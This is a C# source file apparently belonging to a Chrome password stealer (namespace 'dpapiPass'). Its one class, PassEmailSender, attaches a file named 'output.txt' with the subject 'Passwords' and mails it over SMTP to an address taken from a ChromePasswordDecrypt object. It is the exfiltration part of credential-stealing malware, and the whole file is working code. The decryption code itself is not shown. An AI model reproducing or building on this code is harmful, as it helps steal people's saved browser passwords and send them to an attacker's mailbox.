using System;
using System.Net;
using System.Net.Mail;

namespace dpapiPass
{
    class PassEmailSender
    {
        public const string PATH = "output.txt";
        public const string HOST = "host";
        public const string EMAIL_FROM = "email_from";
        public const string PASSWORD = "password";
        public const string EMAIL_TO = "email_to";
        public const string CAPTION = "Passwords";
        public const string MESSAGE = "This is attach with passwords...";
        public const int PORT = 587;

        public PassEmailSender(){}

        public void sendMail(ChromePasswordDecrypt chromePasswordDecrypt)
        {
            try
            {
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(chromePasswordDecrypt.get(EMAIL_FROM));
                mail.To.Add(new MailAddress(chromePasswordDecrypt.get(EMAIL_TO)));
                mail.Subject = CAPTION;
                mail.Body = MESSAGE;
                if (!string.IsNullOrEmpty(PATH))
                    mail.Attachments.Add(new Attachment(PATH));

                SmtpClient client = new SmtpClient();
                client.Host = chromePasswordDecrypt.get(HOST);
                client.Port = PORT;
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential(chromePasswordDecrypt.get(EMAIL_FROM).Split('@')[0], chromePasswordDecrypt.get(PASSWORD));
                client.DeliveryMethod = SmtpDeliveryMethod.Network;
                client.Send(mail);
                mail.Dispose();
            }
            catch (Exception e)
            {
                throw new Exception("Mail.Send: " + e.Message);
            }
        }
    }
}
